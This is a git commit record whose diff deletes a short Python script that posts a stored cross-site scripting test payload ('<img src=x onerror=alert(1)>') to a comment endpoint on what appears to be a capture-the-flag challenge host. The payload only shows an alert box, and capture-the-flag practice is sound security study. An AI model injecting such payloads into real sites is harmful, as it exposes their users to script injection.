655baa5fb58b1fcc6997a704be23f33138378f21
jeff160 <wapindustries2022@gmail.com>
2026-05-11 15:12:17 +0800

    bruh

--- Helicopter Administrators/test.py
+++
@@ -1,9 +0,0 @@
-import requests
-
-url = 'https://a91678fa6cce40f9.247ctf.com/'
-
-res = requests.post(f'{url}/comment/1', data={
-    'comment': '<img src=x onerror=alert(1)>'
-})
-
-print(res.text)
